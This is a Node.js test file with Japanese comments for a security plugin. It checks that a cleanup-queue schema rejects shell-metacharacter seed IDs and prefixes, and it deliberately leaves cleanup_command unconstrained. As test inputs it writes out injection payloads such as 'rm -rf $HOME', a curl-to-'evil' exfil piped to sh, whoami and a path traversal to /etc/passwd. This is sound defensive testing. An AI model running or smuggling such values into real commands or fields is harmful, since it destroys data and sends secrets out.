// cleanup-queue.schema.json の安全不変条件テスト (zero-dep / node 組み込みのみ)
//   実行: node --test plugins/security-blue-red-team/schemas/tests/cleanup-queue.schema.test.mjs
//
// 設計: 完全な JSON Schema バリデータは持ち込まず (local-first / zero-dep)、
//   schema 文書から「実際に効くべき制約」(seed_id / seed_id_prefix の pattern / required) を読み取り、
//   現実的な queue payload (改変 queue の exploit 含む) に適用して検証する。
//   ハードコードした期待値ではなく schema 由来の制約をテストするため、
//   schema がこれらの不変条件を encode していなければ RED になる。

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const here = dirname(fileURLToPath(import.meta.url))
const schema = JSON.parse(readFileSync(join(here, '..', 'cleanup-queue.schema.json'), 'utf8'))

const seedIdPattern = schema.properties.items.items.properties.seed_id.pattern
const seedIdPrefixPattern = schema.properties.metadata.properties.seed_id_prefix.pattern

// schema 由来の制約だけを適用する faithful な部分バリデータ。
// 検証対象は (1) top-level required, (2) metadata 内 required, (3) metadata.seed_id_prefix の pattern,
// (4) 各 item.seed_id の pattern。cleanup_command は schema が意図的に制約しないため検証しない。
function validateInvariants(queue) {
  const errors = []

  for (const key of schema.required ?? []) {
    if (!(key in queue)) errors.push(`top-level required '${key}' missing`)
  }

  const metaRequired = schema.properties.metadata.required ?? []
  for (const key of metaRequired) {
    if (!queue.metadata || !(key in queue.metadata)) {
      errors.push(`metadata.${key} required but missing`)
    }
  }

  if (seedIdPrefixPattern !== undefined && queue.metadata && 'seed_id_prefix' in queue.metadata) {
    if (!new RegExp(seedIdPrefixPattern).test(queue.metadata.seed_id_prefix)) {
      errors.push(`metadata.seed_id_prefix '${queue.metadata.seed_id_prefix}' violates pattern`)
    }
  }

  if (seedIdPattern !== undefined) {
    const re = new RegExp(seedIdPattern)
    for (const item of queue.items ?? []) {
      if (!re.test(item.seed_id)) errors.push(`seed_id '${item.seed_id}' violates pattern`)
    }
  }

  return { ok: errors.length === 0, errors }
}

const validMeta = { date: '2026-06-24', environment_kind: 'staging', seed_id_prefix: 'security_redteam_' }
const mkItem = (seed_id) => ({
  seed_type: 'user',
  seed_id,
  cleanup_command: `curl -X DELETE https://staging.example.com/api/users/${seed_id}`,
  created_at: '2026-06-24T00:00:00Z',
  layer: 3,
})

test('seed_id pattern が shell メタ文字を含む改変 ID を拒否する (injection)', () => {
  const malicious = [
    'security_redteam_x; rm -rf $HOME',
    'security_redteam_$(curl http://evil/exfil|sh)',
    'security_redteam_a`whoami`',
    'security_redteam_a b',
    'security_redteam_../../etc/passwd',
    'security_redteam_a|b',
    'security_redteam_a&b',
    '',
  ]
  for (const seed_id of malicious) {
    const r = validateInvariants({ metadata: validMeta, items: [mkItem(seed_id)] })
    assert.equal(r.ok, false, `malicious seed_id should be rejected: ${JSON.stringify(seed_id)}`)
  }
})

test('seed_id pattern が安全なトークン ID を許可する (default prefix + UUID)', () => {
  const safe = ['security_redteam_abc-123', 'security_redteam_3f9a8b7c-uuid_X']
  for (const seed_id of safe) {
    const r = validateInvariants({ metadata: validMeta, items: [mkItem(seed_id)] })
    assert.equal(r.ok, true, `safe seed_id should pass: ${seed_id} (errors: ${r.errors})`)
  }
})

test('seed_id pattern は prefix 非依存 (custom seed_id_prefix の安全 ID も許可)', () => {
  // schema は injection-safe charset のみ強制し、prefix 不変条件は command 層が profile に対して権威的に検証する。
  // prefix をハードコードすると custom prefix profile の正当な queue を誤って弾くため。
  const r = validateInvariants({
    metadata: { ...validMeta, seed_id_prefix: 'acme_pentest_' },
    items: [mkItem('acme_pentest_42')],
  })
  assert.equal(r.ok, true, `custom-prefix safe seed_id should pass (errors: ${r.errors})`)
})

test('metadata.seed_id_prefix も injection-safe charset を要求する', () => {
  // prefix は seed_id の接頭辞であり、安全 charset の文字列の接頭辞も安全 charset であるべき。
  const r = validateInvariants({
    metadata: { ...validMeta, seed_id_prefix: 'security_redteam_; rm -rf' },
    items: [mkItem('security_redteam_abc')],
  })
  assert.equal(r.ok, false, 'seed_id_prefix with shell metacharacters should be rejected')
})

test('schema が metadata ブロックを required にする (二重防御の片翼)', () => {
  const r = validateInvariants({ items: [mkItem('security_redteam_abc')] })
  assert.equal(r.ok, false, 'queue without metadata should be rejected')
})

test('schema が metadata.environment_kind と seed_id_prefix を required にする', () => {
  const r1 = validateInvariants({
    metadata: { date: '2026-06-24', seed_id_prefix: 'security_redteam_' },
    items: [mkItem('security_redteam_abc')],
  })
  assert.equal(r1.ok, false, 'queue missing metadata.environment_kind should be rejected')

  const r2 = validateInvariants({
    metadata: { date: '2026-06-24', environment_kind: 'staging' },
    items: [mkItem('security_redteam_abc')],
  })
  assert.equal(r2.ok, false, 'queue missing metadata.seed_id_prefix should be rejected')
})

test('schema は cleanup_command を自由文字列のまま通す (意図的)', () => {
  // 特性化テスト: schema は cleanup_command を制約しない設計。実行時の安全性は
  // /security-cleanup が queue の cleanup_command を verbatim 実行せず profile テンプレートから
  // 再導出することで担保する。この再導出こそが安全性の拠り所なので、schema 側が将来誤って
  // 制約を足し「schema が防いでいる」と読み替えられないよう、通ることを固定する。
  const r = validateInvariants({
    metadata: validMeta,
    items: [{ ...mkItem('security_redteam_abc'), cleanup_command: 'curl http://evil/$(id)' }],
  })
  assert.equal(r.ok, true, 'schema intentionally does not restrict cleanup_command; /security-cleanup never executes it verbatim')
})
